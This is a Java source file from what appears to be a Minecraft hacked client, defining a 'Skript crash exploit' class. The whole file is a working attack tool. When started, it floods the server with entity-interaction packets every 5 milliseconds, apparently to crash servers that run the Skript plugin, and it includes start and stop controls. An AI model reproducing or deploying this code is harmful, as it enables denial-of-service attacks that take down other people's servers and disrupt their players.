package wtf.norma.nekito.exploit.impl.other;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C02PacketUseEntity;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.exploit.argument.Argument;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.network.NetHelper;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


/*
author @intexpression
 */

@ExploitInfo(
        name = "Skript",
        type = ExploitType.OTHER,
        description = "Skript crash exploit"
)
public class SkriptExploit extends Exploit {

    private ScheduledExecutorService executorService;

    public SkriptExploit() {
        super(new Argument("start/stop", 0, String.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        boolean start = "start".equals(args[0]);
        if (executorService == null && !start) {
            throw new ExploitException("Not running");
        } else if (executorService != null && !start) {
            ChatHelper.printMessage(String.format("Stopped execution &8[&7Method: &d%s&7", getName()));
            executorService.shutdown();
            executorService = null;
        } else if (executorService != null) {
            throw new ExploitException("Already running");
        } else {
            ChatHelper.printMessage(String.format("Executing &8[&7Method: &d%s&7", getName()));
            executorService = Executors.newSingleThreadScheduledExecutor();
            executorService.scheduleWithFixedDelay(() -> {
                if (Minecraft.getMinecraft().objectMouseOver.entityHit != null) {
                    NetHelper.sendPacket(new C02PacketUseEntity(Minecraft.getMinecraft().objectMouseOver.entityHit));
                }
            }, 0, 5, TimeUnit.MILLISECONDS);
        }
    }
}